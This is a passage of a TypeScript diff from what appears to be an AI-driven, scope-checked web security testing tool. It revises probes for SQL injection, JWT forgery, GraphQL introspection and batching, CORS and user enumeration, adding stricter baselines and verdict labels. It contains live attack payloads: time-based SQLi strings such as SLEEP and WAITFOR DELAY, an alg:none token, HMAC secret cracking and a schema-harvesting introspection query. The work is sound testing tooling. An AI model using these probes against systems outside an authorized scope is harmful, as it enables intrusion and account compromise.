+            return txt(JSON.stringify({ technique: null, result: "unverified", baselineEvidenceId: benign.evId, evidenceIds: sentEvIds, verdict: `UNVERIFIED: the benign baseline did not reach a valid app response (status ${benign.status}${isAuthRedirect(benign) ? " — redirected to an auth/login page" : ""}). The endpoint cannot be probed through this session, so SQLi is neither confirmed nor ruled out here.` }));
+          // Structured ledger contract: `result` is set at THIS branch (never parsed from verdict text),
+          // `baselineEvidenceId` = the benign leg that validates the baseline, `evidenceIds` = every leg sent.
           // ── noise-floor ── measure the page's own per-request jitter from two benign baselines (normalized to strip
           //   __VIEWSTATE / nonce / CSRF / timestamps). A boolean length delta is only trusted when it CLEARS this noise —
           //   a fixed ±64 got fooled by dynamic content into confirming SQLi from nothing.
@@ -2540,13 +3131,13 @@ export function buildTools(s: PilotSession) {
           // ── boolean-based: matched TRUE/FALSE pairs only. Never mix a quoted FALSE with an unquoted TRUE
           //   (that FP'd Drupal HTML search: two different search strings, not a SQL tautology). HTML/text length
           //   is not an oracle — only JSON/XML (Juice Shop /rest/products/search still confirms). ──
-          const usable = (x: { status: number; body: string }): boolean => x.status >= 200 && x.status < 300 && !looksBlocked(x);
+          const usable = (x: { status: number; headers?: Record<string, string>; body: string }): boolean => validAppBaseline(x) && !looksBlocked(x);
           let subNoise = false;
           let unstructuredLength = false;
           for (const pair of SQLI_BOOLEAN_PAIRS) {
             const falseR = await send(pair.f, "negative_control", `boolean FALSE ${pair.f}`);
             if (falseR && looksBlocked(falseR)) {
-              return txt(JSON.stringify({ technique: null, blocked: true, verdict: `BLOCKED: the target returned a WAF / bot-challenge page (status ${falseR.status}) instead of the app — probes are not reaching it, so SQLi cannot be confirmed here. Do NOT record a finding from these responses.` }));
+              return txt(JSON.stringify({ technique: null, blocked: true, result: "blocked", baselineEvidenceId: benign.evId, evidenceIds: sentEvIds, verdict: `BLOCKED: the target returned a WAF / bot-challenge page (status ${falseR.status}) instead of the app — probes are not reaching it, so SQLi cannot be confirmed here. Do NOT record a finding from these responses.` }));
             }
             const t1 = await send(pair.t, "positive_replay", `boolean TRUE ${pair.t}`);
             if (!t1 || !falseR || !usable(t1)) continue; // TRUE must be a real 2xx app response; FALSE MAY be non-2xx (the classic "no row" status flip)
@@ -2557,7 +3148,7 @@ export function buildTools(s: PilotSession) {
               // (the two payloads are both valid injections differing only in '1'='1' vs '1'='2'). Confirm with a replay.
               const t2 = await send(pair.t, "positive_replay", `boolean TRUE#2 ${pair.t}`);
               if (t2 && usable(t2) && t2.status === t1.status)
-                return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) status ${t1.status} vs FALSE(${pair.f}) status ${falseR.status}, stable across replays. record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
+                return txt(JSON.stringify({ technique: "boolean", result: "confirmed", baselineEvidenceId: benign.evId, evidenceIds: sentEvIds, negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) status ${t1.status} vs FALSE(${pair.f}) status ${falseR.status}, stable across replays. record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
               continue;
             }
             if (!booleanLengthConfirmsSqli(t1.body, falseR.body, pair.t, pair.f, thr)) {
@@ -2567,25 +3158,33 @@ export function buildTools(s: PilotSession) {
             }
             const t2 = await send(pair.t, "positive_replay", `boolean TRUE#2 ${pair.t}`);
             if (t2 && usable(t2) && booleanLengthConfirmsSqli(t2.body, falseR.body, pair.t, pair.f, thr) && Math.abs(t2.nlen - t1.nlen) <= thr)
-              return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) vs FALSE ${pair.f} on a structured (JSON/XML) response (delta > noise-floor ${thr}). record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
+              return txt(JSON.stringify({ technique: "boolean", result: "confirmed", baselineEvidenceId: benign.evId, evidenceIds: sentEvIds, negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) vs FALSE ${pair.f} on a structured (JSON/XML) response (delta > noise-floor ${thr}). record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
           }
           const timing = await probeTiming(s, buildReq, "claude-pilot-sqli", ["' AND SLEEP(5)-- -", " AND SLEEP(5)-- -", "' AND pg_sleep(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "' OR SLEEP(5)-- -"]);
-          if (timing) return txt(JSON.stringify(timing));
+          if (timing) return txt(JSON.stringify({ result: "confirmed", baselineEvidenceId: benign.evId, evidenceIds: sentEvIds, ...timing }));
           if (unstructuredLength)
             return txt(JSON.stringify({
               technique: null,
+              result: invalidLegs > 0 ? "unverified" : "clean",
+              baselineEvidenceId: benign.evId,
+              evidenceIds: sentEvIds,
               errorSignature: errSig ?? null,
-              verdict: `not confirmed: HTML/document length changed with the query — that is result-page variance (Drupal/marketing search), not boolean SQLi. Do NOT record_finding(sqli) from that delta. Time-based did not confirm.${errSig ? ` SQL error signature seen ("${errSig}") — a hint, not confirmation.` : ""} A JSON/API boolean differential would confirm.`,
+              verdict: `${invalidLegs > 0 ? `UNVERIFIED: ${invalidLegs} probe leg(s) never reached a valid app response (error/auth redirect), so the negative is not conclusive. ` : ""}not confirmed: HTML/document length changed with the query — that is result-page variance (Drupal/marketing search), not boolean SQLi. Do NOT record_finding(sqli) from that delta. Time-based did not confirm.${errSig ? ` SQL error signature seen ("${errSig}") — a hint, not confirmation.` : ""} A JSON/API boolean differential would confirm.`,
             }));
           if (subNoise)
-            return txt(JSON.stringify({ technique: "boolean", suspected: true, verdict: `SUSPECTED (not confirmed): a boolean length difference was seen but it is WITHIN the page's natural variance (noise floor ${thr}) — not reliably distinguishable from dynamic content. Record as SUSPECTED (a lead), not confirmed, unless you get a second independent signal (time-based delay or a SQL error). ${errSig ? `SQL error signature also seen: ${errSig}.` : ""}` }));
+            return txt(JSON.stringify({ technique: "boolean", suspected: true, result: "suspected", baselineEvidenceId: benign.evId, evidenceIds: sentEvIds, verdict: `SUSPECTED (not confirmed): a boolean length difference was seen but it is WITHIN the page's natural variance (noise floor ${thr}) — not reliably distinguishable from dynamic content. Record as SUSPECTED (a lead), not confirmed, unless you get a second independent signal (time-based delay or a SQL error). ${errSig ? `SQL error signature also seen: ${errSig}.` : ""}` }));
           return txt(
             JSON.stringify({
               technique: null,
+              result: errSig || invalidLegs > 0 ? "unverified" : "clean",
+              baselineEvidenceId: benign.evId,
+              evidenceIds: sentEvIds,
               errorSignature: errSig ?? null,
-              verdict: errSig
-                ? `SQL error signature seen ("${errSig}") but boolean/time did not confirm — likely SQLi behind a filter; try tailored payloads via http_request (different quote/comment styles, UNION, or the login-bypass oracle on auth screens).`
-                : "not confirmed: no boolean content-difference and no time delay. If this is a login form, test auth-bypass (success = a session/redirect, not an error).",
+              verdict: invalidLegs > 0
+                ? `UNVERIFIED: ${invalidLegs} probe leg(s) never reached a valid app response (server error / auth redirect / proxy). The attempts that did run found no boolean difference and no time delay, but the failed legs leave SQLi undecided — retry when the session reaches the endpoint reliably.`
+                : errSig
+                  ? `SQL error signature seen ("${errSig}") but boolean/time did not confirm — likely SQLi behind a filter; try tailored payloads via http_request (different quote/comment styles, UNION, or the login-bypass oracle on auth screens).`
+                  : "not confirmed: no boolean content-difference and no time delay. If this is a login form, test auth-bypass (success = a session/redirect, not an error).",
             }),
           );
         } catch (e) {
@@ -2614,7 +3213,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-nosql",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `nosql ${tag}`,
           });
@@ -2668,7 +3267,7 @@ export function buildTools(s: PilotSession) {
           if (!isInScope(req.url, s.scope)) return null;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-cors", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `cors ${tag}` });
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-cors", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `cors ${tag}` });
           return { evId: ev.id, acao: (res.headers["access-control-allow-origin"] ?? "").trim().toLowerCase(), acac: (res.headers["access-control-allow-credentials"] ?? "").trim().toLowerCase(), status: res.status };
         };
         try {
@@ -2704,7 +3303,7 @@ export function buildTools(s: PilotSession) {
           if (!isInScope(req.url, s.scope)) return null;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-proto", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `proto ${tag}` });
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-proto", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `proto ${tag}` });
           return { evId: ev.id, status: res.status, body: res.body };
         };
         try {
@@ -2761,7 +3360,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-redirect",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `redirect ${tag} ${param}`,
           });
@@ -2833,6 +3432,7 @@ export function buildTools(s: PilotSession) {
         }
         const candidates = jwtForgeCandidates(s.currentBearer, mutate, publicKeyPem ? { publicKeyPem } : {});
         if (candidates.length === 0) return txt("could not parse the current Bearer token as a JWT (header.payload.signature).");
+        const sentEvIds: string[] = [];
         const send = async (bearer: string, kind: "negative_control" | "positive_replay", tag: string) => {
           const req: HttpRequest = { method: "GET", url, headers: { ...authHeaders(s), authorization: `Bearer ${bearer}` }, body: null };
           const res = await s.http.send(req);
@@ -2841,43 +3441,81 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-jwt",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `jwt ${tag}`,
           });
-          return { evId: ev.id, status: res.status, len: res.body.length };
+          sentEvIds.push(ev.id);
+          return { evId: ev.id, status: res.status, headers: res.headers, body: res.body, len: res.body.length };
+        };
+        /** A forged/garbage token's outcome on this endpoint:
+         *  - "accepted": real protected content — a valid app response (2xx + real body). A 200
+         *    login/proxy page is NEVER acceptance.
+         *  - "rejected": the app refused the token — 401/403, a bounce to an auth/login page, or an
+         *    inline login-wall body. A 302→login is REJECTION, never acceptance.
+         *  - "inconclusive": server error / proxy / invalid input / ambiguous redirect — no
+         *    authorization decision was made (a 404/422 means the request never reached one). */
+        const legOutcome = (r: { status: number; headers?: Record<string, string>; body?: string }): "accepted" | "rejected" | "inconclusive" => {
+          if (validAppBaseline(r)) return "accepted";
+          if (r.status === 401 || r.status === 403 || isAuthRedirect(r) || isAuthWallBody(r)) return "rejected";
+          return "inconclusive";
         };
         try {
+          // The ORIGINAL token is the baseline: "forgeries denied" is only a clean result when the real
+          // session actually works on this url — otherwise nothing proved the endpoint accepts valid JWTs.
+          const orig = await send(s.currentBearer, "negative_control", "original-token baseline");
           const ctrl = await send("eyJhbGciOiJub25lIn0.eyJpbnZhbGlkIjp0cnVlfQ.", "negative_control", "garbage/invalid token");
           const tried: string[] = [];
+          let inconclusiveLegs = 0;
           for (const c of candidates) {
             tried.push(c.technique);
             const p1 = await send(c.token, "positive_replay", `${c.technique} #1`);
-            if (!(p1.status < 400 && ctrl.status >= 400)) continue;
+            const o1 = legOutcome(p1);
+            if (o1 !== "accepted" || legOutcome(ctrl) !== "rejected") {
+              if (o1 === "inconclusive") inconclusiveLegs++;
+              continue;
+            }
             const p2 = await send(c.token, "positive_replay", `${c.technique} #2`);
-            if (p2.status >= 400) continue;
+            if (legOutcome(p2) !== "accepted") {
+              if (legOutcome(p2) === "inconclusive") inconclusiveLegs++;
+              continue;
+            }
             const secretBit = c.secret !== undefined ? ` HMAC secret ${c.secret === "" ? "(empty string)" : JSON.stringify(c.secret)}.` : "";
             return txt(
               JSON.stringify({
                 technique: c.technique,
                 ...(c.secret !== undefined ? { secret: c.secret } : {}),
+                result: "confirmed",
+                baselineEvidenceId: orig.evId,
+                evidenceIds: sentEvIds,
                 negativeControl: ctrl.evId,
                 positiveReplays: [p1.evId, p2.evId],
                 control: { status: ctrl.status },
                 forged: [{ status: p1.status }, { status: p2.status }],
-                verdict: `JWT FORGERY (${c.technique}) — minted token ACCEPTED while the garbage control was rejected.${secretBit} record_finding(session, severity high/critical) with these evidenceIds.`,
+                verdict: `JWT FORGERY (${c.technique}) — minted token ACCEPTED (2xx protected content) while the garbage control was rejected.${secretBit} record_finding(session, severity high/critical) with these evidenceIds.`,
               }),
             );
           }
           const cracked = candidates.find((c) => c.secret !== undefined);
+          const baselineOk = validAppBaseline(orig);
+          const ctrlRejected = legOutcome(ctrl) === "rejected";
           return txt(
             JSON.stringify({
               tried,
+              result: !baselineOk || !ctrlRejected || inconclusiveLegs > 0 ? "unverified" : "clean",
+              baselineEvidenceId: orig.evId,
+              evidenceIds: sentEvIds,
               ...(cracked ? { hmacCracked: { technique: cracked.technique, secret: cracked.secret } } : {}),
               control: { status: ctrl.status },
-              verdict: cracked
-                ? `not confirmed on this url: HMAC secret is ${JSON.stringify(cracked.secret)} but the minted token was not accepted (control ${ctrl.status}). Try another identity endpoint. alg:none variants also rejected.`
-                : `not confirmed: no candidate accepted (control ${ctrl.status}; tried ${tried.join(", ")}). Need forged<400 and control>=400.`,
+              verdict: !baselineOk
+                ? `UNVERIFIED: the original token did not reach a valid app response (status ${orig.status}${isAuthRedirect(orig) ? " — redirected to login" : ""}), so "forgeries denied" cannot be trusted — the endpoint may not accept ANY JWT here.`
+                : !ctrlRejected
+                  ? `UNVERIFIED: the garbage-token control was not cleanly rejected (status ${ctrl.status}), so the endpoint's JWT validation could not be evaluated.`
+                  : inconclusiveLegs > 0
+                    ? `UNVERIFIED: ${inconclusiveLegs} forgery leg(s) ended without an authorization decision (server error / ambiguous redirect) — the negative is not conclusive.`
+                    : cracked
+                      ? `not confirmed on this url: HMAC secret is ${JSON.stringify(cracked.secret)} but the minted token was not accepted (control ${ctrl.status}). Try another identity endpoint. alg:none variants also rejected.`
+                      : `not confirmed: no candidate accepted (control ${ctrl.status}; tried ${tried.join(", ")}). A forged token is only "accepted" on a 2xx protected-content response — 4xx or a redirect to login counts as rejection.`,
             }),
           );
         } catch (e) {
@@ -2907,13 +3545,14 @@ export function buildTools(s: PilotSession) {
         const fire = async (user: string, kind: "negative_control" | "positive_replay", tag: string) => {
           const p = placed(user)!;
           if (!isInScope(p.url, s.scope)) throw new Error(`out of scope: ${p.url}`);
-          // Pre-auth on purpose: do NOT attach the session cookie/Bearer (a logged-in login form is not an enum surface).
+          // Pre-auth on purpose: do NOT attach the session cookie/Bearer OR the inherited default auth headers
+          // (site Basic / custom auth headers would silently re-authenticate a "pre-auth" probe).
           const hdr: Record<string, string> = {};
           if (p.body != null) {
             const t = p.body.trim();
             hdr["content-type"] = t.startsWith("{") || t.startsWith("[") ? "application/json" : "application/x-www-form-urlencoded";
           }
-          const req: HttpRequest = { method: meth, url: p.url, headers: hdr, body: p.body };
+          const req: HttpRequest = { method: meth, url: p.url, headers: hdr, body: p.body, inheritDefaultHeaders: false };
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
           const stamped = { ...res, body: `${res.body}\n[VERDICT-USER-ENUM] status:${res.status}` };
@@ -2921,7 +3560,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-user-enum",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: stamped,
             note: `user-enum ${tag} user=${user}`,
           });
@@ -2982,7 +3621,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-secrets",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `secrets ${tag}`,
           });
@@ -3033,7 +3672,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-headers",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `headers ${tag}`,
           });
@@ -3071,34 +3710,63 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "probe_graphql",
-      'Confirm GraphQL-specific weaknesses on `url` (the GraphQL endpoint, POST JSON {query}): (1) introspection publicly enabled — the whole schema is readable via __schema (info-disclosure; harvest it for hidden queries/mutations and plan field-level authz on them); (2) field-suggestion leakage — validation errors name real schema fields ("Did you mean") even when introspection is disabled, proven with the universal __typename typo; (3) request batching — an array body is accepted (rate-limit/lockout bypass primitive). Each returns negativeControl + positiveReplays evidenceIds (+ effectMarker for 1-2) → record_finding(category info-disclosure, param introspection|field-suggestions; category rate-limit, param batching). READ-ONLY: meta-fields only ({__typename}/__schema), never sends mutations or depth/complexity queries.',
+      'Probe a GraphQL endpoint\'s meta-surface (POST JSON {query} to `url`). (1) INTROSPECTION: sends a bounded schema-catalog query (root types + every type\'s field/arg NAMES — not a full schema; field/input types are out of scope) — on success the discovered query/mutation names are returned in `schemaOps` (feed them to probe_graphql_op). The marker is the "types" key of the real schema body, never a bare queryType name. Whether it is PUBLIC is then REPLAYED WITHOUT any auth headers: "public" is claimed ONLY when the unauthenticated replay also returns the schema; if it only works under the current session it is "introspection enabled (authenticated context)" — still info-disclosure, not anonymous exposure. (2) field-suggestion leakage — validation errors name real schema fields ("Did you mean"), proven with a misspelled REAL root field from the harvest (the __typename meta-typo is only the fallback; meta-fields get no suggestions on spec-conformant engines). (3) request batching — an array body is accepted. ACCEPTANCE IS A FEATURE OBSERVATION ONLY (category info-disclosure / param batching, info/low at most) — record_finding REJECTS a rate-limit/lockout bypass claim on this evidence; a bypass needs demonstrated harm this probe does not produce. Each returns negativeControl + positiveReplays evidenceIds (+ effectMarker for 1-2) → record_finding(category info-disclosure, param introspection|field-suggestions|batching). READ-ONLY: meta-fields only ({__typename}/__schema), never sends mutations or depth/complexity queries.',
       { url: z.string() },
       async ({ url }) => {
         if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
-        const fire = async (body: string, kind: "negative_control" | "positive_replay", tag: string) => {
-          const req: HttpRequest = { method: "POST", url, headers: { ...authHeaders(s), "content-type": "application/json", accept: "application/json" }, body };
+        const fire = async (body: string, kind: "negative_control" | "positive_replay", tag: string, auth: Record<string, string> = authHeaders(s), anonymous = false) => {
+          const req: HttpRequest = {
+            method: "POST",
+            url,
+            headers: { ...auth, "content-type": "application/json", accept: "application/json" },
+            body,
+            // anonymous replays must not inherit the client's default auth headers (site Basic / custom auth headers)
+            ...(anonymous ? { inheritDefaultHeaders: false } : {}),
+          };
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
           const ev = s.evidence.record({
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-graphql",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `graphql ${tag}`,
           });
           return { evId: ev.id, status: res.status, body: res.body };
         };
         // Markers are matched on the RESPONSE body only, and each is impossible for a request-echo / catch-all to
-        // satisfy: the query text never contains the quoted JSON key "queryType", and a parsed array of GraphQL
-        // results cannot come from echoing the single-object control.
-        const INTRO = JSON.stringify({ query: "{__schema{queryType{name}}}" });
+        // satisfy: the quoted "types"+"queryType" pair is the real schema's own keys (not our request text), and a
+        // parsed array of GraphQL results cannot come from echoing the single-object control.
+        // Bounded schema catalog: root types + every type's field/arg NAMES (ofType depth 2 covers args). This
+        // is NOT a full schema — field return types and inputField types are deliberately out of scope; the
+        // harvest exists to NAME real operations for probe_graphql_op, not to model the schema.
+        const INTRO_FULL = JSON.stringify({
+          query:
+            "query Introspect{__schema{queryType{name} mutationType{name} subscriptionType{name} types{kind name fields{name args{name type{kind name ofType{kind name ofType{kind name}}}}} inputFields{name} enumValues{name}}}}",
+        });
         const INTRO_TYPO = JSON.stringify({ query: "{__schemaX{queryType{name}}}" });
         const TYPENAME = JSON.stringify({ query: "{__typename}" });
         const TYPENAME_TYPO = JSON.stringify({ query: "{__typenme}" });
         const BATCH = JSON.stringify([{ query: "{__typename}" }, { query: "{__typename}" }]);
-        const introHit = (b: string): boolean => b.includes('"queryType"');
+        const introHit = (b: string): boolean => b.includes('"types"') && b.includes('"queryType"'); // a real schema body, not just a root name
         const suggestHit = (b: string): boolean => /did you mean/i.test(b);
+        /** Compact operation catalog out of a harvested __schema — names real ops for probe_graphql_op to drive. */
+        const harvestSchema = (body: string): { queries: Array<{ name: string; args: string[] }>; mutations: Array<{ name: string; args: string[] }>; typeCount: number } | null => {
+          try {
+            const j = JSON.parse(body) as { data?: { __schema?: { queryType?: { name?: string }; mutationType?: { name?: string }; types?: Array<{ name?: string; kind?: string; fields?: Array<{ name?: string; args?: Array<{ name?: string }> }> }> } } };
+            const sch = j?.data?.__schema;
+            if (!sch || !Array.isArray(sch.types)) return null;
+            const fieldsOf = (typeName: string | undefined): Array<{ name: string; args: string[] }> => {
+              if (!typeName) return [];
+              const t = sch.types!.find((x) => x.name === typeName);
+              return (t?.fields ?? []).filter((f) => !!f.name).map((f) => ({ name: f.name as string, args: (f.args ?? []).map((a) => a.name ?? "").filter(Boolean) }));
+            };
+            return { queries: fieldsOf(sch.queryType?.name).slice(0, 40), mutations: fieldsOf(sch.mutationType?.name).slice(0, 40), typeCount: sch.types.length };
+          } catch {
+            return null;
+          }
+        };
         try {
           // Ping with the always-valid {__typename} meta-field: gates the endpoint being GraphQL at all (and doubles
           // as the suggestion check's negative control — a valid query yields no validation error).
@@ -3127,17 +3795,46 @@ export function buildTools(s: PilotSession) {
               // 400s with "Did you mean"), so the marker — not the status — is the proof (same rationale as XSS).
               { requireSuccess: false },
             );
-            return { name, confirmed: logic.ok, ...(logic.ok ? {} : { reason: logic.reason }), negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId] };
+            return { name, confirmed: logic.ok, ...(logic.ok ? {} : { reason: logic.reason }), negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], bodies: [p1, p2] };
           };
           // (1) introspection: control = typo'd meta-field (__schemaX → validation error, no schema);
-          //     positives = the __schema query → the schema's own "queryType" key is the marker.
+          //     positives = the bounded __schema catalog → the schema's own "types"+"queryType" keys are the marker.
+          //     A root-type-name-only answer is NOT claimed as a readable catalog.
           const introControl = await fire(INTRO_TYPO, "negative_control", "introspection control (__schemaX)");
-          const intro = await check("introspection", introControl, INTRO, introHit, "__schema query");
-          // (2) field suggestions: control = the valid {__typename} ping; positives = the __typenme typo →
-          //     'Did you mean "__typename"?' leaks schema names even with introspection disabled.
-          const suggest = await check("field-suggestions", ping, TYPENAME_TYPO, suggestHit, "__typename typo");
-          // (3) batching: array body accepted = a rate-limit / lockout bypass primitive. Structural evidence (array
-          //     vs the single-object control) — confirmed via record_finding's rate-limit/batching branch.
+          const intro = await check("introspection", introControl, INTRO_FULL, introHit, "bounded schema catalog");
+          let schemaOps: ReturnType<typeof harvestSchema> = null;
+          if (intro.confirmed) schemaOps = harvestSchema(intro.bodies[0]!.body);
+          // Suggestion-leak proof needs a typo of a REAL field: __typename is a meta-field absent from the
+          // schema's field list, so spec-conformant engines return 'Cannot query field' WITHOUT a suggestion
+          // for it. Mistype a harvested root field when we have one; __typenme remains the fallback.
+          const suggestionTypo = (): string => {
+            const cand = [...(schemaOps?.queries ?? []), ...(schemaOps?.mutations ?? [])].map((f) => f.name).find((n) => n.length > 3);
+            return cand ? JSON.stringify({ query: `{${cand.slice(0, 2)}${cand.slice(3)}}` }) : TYPENAME_TYPO;
+          };
+          // Was the schema readable WITHOUT auth? Only then is it PUBLIC — an authed-context introspection is
+          // enabled-for-your-account, not anonymous exposure. Replayed unauth as an extra control (never counted
+          // as its own positive).
+          let introspectionPublic: boolean | null = null;
+          let unauthEvId: string | undefined;
+          if (intro.confirmed) {
+            const un = await fire(INTRO_FULL, "negative_control", "introspection unauth replay", {}, true);
+            unauthEvId = un.evId;
+            introspectionPublic = introHit(un.body);
+          }
+          const introNote = !intro.confirmed
+            ? "introspection did not return a schema body"
+            : introspectionPublic === true
+              ? "schema catalog readable via __schema INCLUDING with no auth headers — public introspection (info-disclosure; harvest schemaOps for hidden queries/mutations and drive them with probe_graphql_op)"
+              : introspectionPublic === false
+                ? "schema catalog readable via __schema under the CURRENT session only — introspection enabled in an authenticated context (info-disclosure within your access level, NOT anonymous exposure). schemaOps below."
+                : "schema catalog readable via __schema (unauth replay inconclusive). schemaOps below.";
+          // (2) field suggestions: control = the valid {__typename} ping; positives = a misspelled REAL root field
+          //     (from the harvest) → 'Did you mean "order"?' leaks schema names. __typenme is only the fallback —
+          //     meta-fields are outside the suggestion list on spec-conformant engines.
+          const suggest = await check("field-suggestions", ping, suggestionTypo(), suggestHit, "root-field typo");
+          // (3) batching: array body accepted = a protocol FEATURE — recorded for completeness as an
+          //     info-disclosure-class CAPABILITY observation; acceptance alone is NOT a rate-limit/lockout
+          //     bypass and record_finding rejects a rate-limit claim on this evidence.
           const b1 = await fire(BATCH, "positive_replay", "batching #1");
           const b2 = await fire(BATCH, "positive_replay", "batching #2");
           const batching = {
@@ -3145,25 +3842,319 @@ export function buildTools(s: PilotSession) {
             accepted: isGraphqlBatchResponse(b1.body) && isGraphqlBatchResponse(b2.body) && !isGraphqlBatchResponse(ping.body),
             negativeControl: ping.evId,
             positiveReplays: [b1.evId, b2.evId],
-            category: "rate-limit",
+            category: "info-disclosure",
             param: "batching",
             note:
               isGraphqlBatchResponse(b1.body) && isGraphqlBatchResponse(b2.body) && !isGraphqlBatchResponse(ping.body)
-                ? "request batching (array body) ACCEPTED — a rate-limit/lockout bypass primitive. Record at low/info: acceptance alone is the finding; an actually observed overrun would raise it."
+                ? "request batching (array body) ACCEPTED — a capability observation only (record_finding category info-disclosure, param batching, info/low). A rate-limit/lockout bypass claim is NOT supported by this evidence and is rejected without demonstrated harm."
                 : "array body not accepted",
           };
           const confirmed = [intro, suggest].filter((c) => c.confirmed);
           return txt(
             JSON.stringify({
               checks: [
-                { ...intro, category: "info-disclosure", param: "introspection", effectMarker: '"queryType"', note: "full schema readable via __schema (public introspection) — harvest it for hidden queries/mutations and plan field-level authz (probe_idor / probe_logic with the GraphQL variables as the param) on them" },
-                { ...suggest, category: "info-disclosure", param: "field-suggestions", effectMarker: "Did you mean", note: "validation errors disclose real schema field names (works with introspection disabled)" },
+                { name: intro.name, confirmed: intro.confirmed, ...(intro.reason ? { reason: intro.reason } : {}), negativeControl: intro.negativeControl, positiveReplays: intro.positiveReplays, category: "info-disclosure", param: "introspection", effectMarker: '"types"', public: introspectionPublic, ...(unauthEvId ? { unauthControl: unauthEvId } : {}), note: introNote },
+                { name: suggest.name, confirmed: suggest.confirmed, ...(suggest.reason ? { reason: suggest.reason } : {}), negativeControl: suggest.negativeControl, positiveReplays: suggest.positiveReplays, category: "info-disclosure", param: "field-suggestions", effectMarker: "Did you mean", note: "validation errors disclose real schema field names (works with introspection disabled)" },
               ],
               batching,
+              ...(schemaOps ? { schemaOps } : {}),
               verdict:
                 confirmed.length > 0 || batching.accepted
-                  ? `GRAPHQL WEAKNESS CONFIRMED — ${[...confirmed.map((c) => c.name), ...(batching.accepted ? ["batching"] : [])].join(", ")}. record_finding per check (info-disclosure: introspection|field-suggestions; rate-limit: batching), citing that check's negativeControl + positiveReplays evidenceIds and its effectMarker (batching is structural — no effectMarker needed).`
+                  ? `GRAPHQL OBSERVATIONS — ${[...confirmed.map((c) => c.name), ...(batching.accepted ? ["batching"] : [])].join(", ")}. record_finding per check (info-disclosure: introspection|field-suggestions|batching, effectMarker as given for the first two; batching is a capability observation — rate-limit claims are rejected without demonstrated harm). Introspection severity: info/low normally; higher only when public=true AND the schema exposes privileged operations. schemaOps names real ops — drive them with probe_graphql_op (baseline → role diff); never assume-vulnerable.`
                   : `not confirmed: introspection (${intro.reason}); field-suggestions (${suggest.reason})`,
+            }),
+          );
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
+      },
+    ),
+    tool(
+      "probe_graphql_op",
